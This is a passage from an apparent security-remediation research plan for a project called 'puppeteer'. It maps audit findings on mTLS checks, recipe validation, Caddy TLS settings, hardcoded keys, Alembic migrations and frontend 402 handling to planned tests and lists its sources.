| SEC-02 | Foundry build rejects invalid recipe (build time) | integration | `pytest tests/test_foundry.py::test_build_template_invalid_recipe -xvs` | ❌ Wave 0 |
| ARCH-01 | `alembic upgrade head` runs in lifespan startup | unit | `pytest tests/test_migrations.py::test_alembic_upgrade_head -xvs` | ❌ Wave 0 |
| ARCH-01 | Baseline revision covers full schema | smoke | Manual SQL verification or `alembic current` shows baseline | ❌ Wave 0 |
| SEC-04 | Caddy reverse_proxy uses `tls_trusted_ca_certs` (no `tls_insecure_skip_verify`) | smoke | `grep -r "tls_insecure_skip_verify" puppeteer/cert-manager/Caddyfile` returns nothing | ❌ Wave 0 |
| QUAL-02 | `MANIFEST_PUBLIC_KEY` read from env var (not hardcoded) | unit | `pytest tests/test_licensing.py::test_manifest_key_from_env -xvs` | ❌ Wave 0 |
| QUAL-02 | `LICENCE_PUBLIC_KEY` read from env var (not hardcoded) | unit | `pytest tests/test_licensing.py::test_licence_key_from_env -xvs` | ❌ Wave 0 |
| FEBE-01 | Dashboard intercepts HTTP 402 and shows modal | component | `npm run test -- LicenceExpiredDialog.test.tsx -t "shows modal on 402"` | ❌ Wave 0 |
| FEBE-01 | `authenticatedFetch` throws after showing 402 modal | unit | `npm run test -- authenticatedFetch.test.ts -t "throws on 402"` | ❌ Wave 0 |
| FEBE-02 | All frontend `fetch()` calls use `/api/` prefix | smoke | `grep -r 'fetch.*['"'"'"]\/(?!api\|auth\|ws\|docs\|system)' puppeteer/dashboard/src/` returns nothing | ❌ Wave 0 |
| FEBE-03 | `CreateBlueprintDialog` validates recipe inline | component | `npm run test -- CreateBlueprintDialog.test.tsx -t "shows validation errors"` | ❌ Wave 0 |
| FEBE-03 | Save button disabled when recipe has errors | component | `npm run test -- CreateBlueprintDialog.test.tsx -t "save button disabled on error"` | ❌ Wave 0 |

### Sampling Rate
- **Per task commit:** `pytest tests/test_security.py -x` (mTLS validation) + `pytest tests/test_foundry.py -x` (whitelist) + manual Caddyfile inspection
- **Per wave merge:** Full `pytest` suite (backend) + `npm run test` (frontend) + `npm run build` (no TypeScript errors)
- **Phase gate:** All 22 test requirements passing before `/gsd:verify-work`

### Wave 0 Gaps
- [ ] `tests/test_security.py` — 6 tests covering SEC-01 (verify_client_cert acceptance/rejection/revocation)
- [ ] `tests/test_foundry.py` — 5 tests covering SEC-02 (validate_injection_recipe whitelist)
- [ ] `tests/test_migrations.py` — 2 tests covering ARCH-01 (alembic startup, baseline validation)
- [ ] `tests/test_licensing.py` — 2 tests covering QUAL-02 (env var public keys)
- [ ] `puppeteer/dashboard/src/components/LicenceExpiredDialog.test.tsx` — 2 tests for FEBE-01 (modal rendering, 402 interception)
- [ ] `puppeteer/dashboard/src/auth.test.ts` — 1 test for FEBE-01 (authenticatedFetch 402 handling)
- [ ] `puppeteer/dashboard/src/views/CreateBlueprintDialog.test.tsx` — 2 tests for FEBE-03 (inline validation, save button state)
- [ ] Manual Caddyfile audit: Verify all `tls_insecure_skip_verify` replaced with `tls_trusted_ca_certs` (SEC-04)
- [ ] Manual frontend audit: Grep all `fetch()` calls for `/api/` prefix compliance (FEBE-02)
- [ ] Alembic configuration file: `puppeteer/alembic.ini` + baseline migration setup (ARCH-01)

*(22 test requirements mapped, all Wave 0 infrastructure needed)*

---

## Sources

### Primary (HIGH confidence)
- **Adversarial Audit Reports** (mop_validation/adversarial_audit_20260417/):
  - EXECUTIVE_SUMMARY.md — Overview of all 5 critical findings
  - SECURITY_VULNERABILITIES.md — Detailed SEC-01 through SEC-05
  - ARCHITECTURAL_DEBT.md — ARCH-01 through ARCH-05
  - FE_BE_GAPS.md — FEBE-01 through FEBE-03
  - CODE_QUALITY_ANTIPATTERNS.md — QUAL-01 through QUAL-04
- **CONTEXT.md** (164-CONTEXT.md) — Locked decisions and discretion areas for this phase
- **Source code inspection**:
  - `puppeteer/agent_service/security.py:127` — Verified `verify_client_cert` is a NO-OP stub
  - `puppeteer/agent_service/services/foundry_service.py:278` — Verified `injection_recipe` appended without validation
  - `puppeteer/cert-manager/Caddyfile` — Verified 6 instances of `tls_insecure_skip_verify`
  - `puppeteer/agent_service/ee/*.py` — Verified hardcoded `_MANIFEST_PUBLIC_KEY_PEM` and `_LICENCE_PUBLIC_KEY_BYTES`
  - `puppeteer/` — Verified 55 migration_v*.sql files with no Alembic setup

### Secondary (MEDIUM confidence)
- FastAPI documentation on dependency injection pattern (Depends)
- Caddy documentation on client_auth policy and reverse_proxy TLS configuration
- Alembic documentation on baseline migrations and autogenerate
- SQLAlchemy ORM best practices for schema migrations

### Tertiary (LOW confidence)
- RFC 5280 (X.509 certificates) and CRL format specification

---

## Metadata

**Confidence breakdown:**
- **Standard stack:** HIGH — All recommendations verified against code and audit reports
- **Architecture:** HIGH — Patterns documented in CONTEXT.md (locked decisions) and audit reports
- **Pitfalls:** HIGH — Drawn from audit findings and common database/security migration patterns
- **Testing strategy:** MEDIUM — Test map is comprehensive but some test IDs are prescriptive (implementation may vary slightly)

**Research date:** 2026-04-17  
**Valid until:** 2026-05-01 (14 days for stable security/architecture changes)

---

*Phase: 164-adversarial-audit-remediation*  
*Domain: Security & Architecture Remediation*  
*Status: Research complete — Ready for planning*
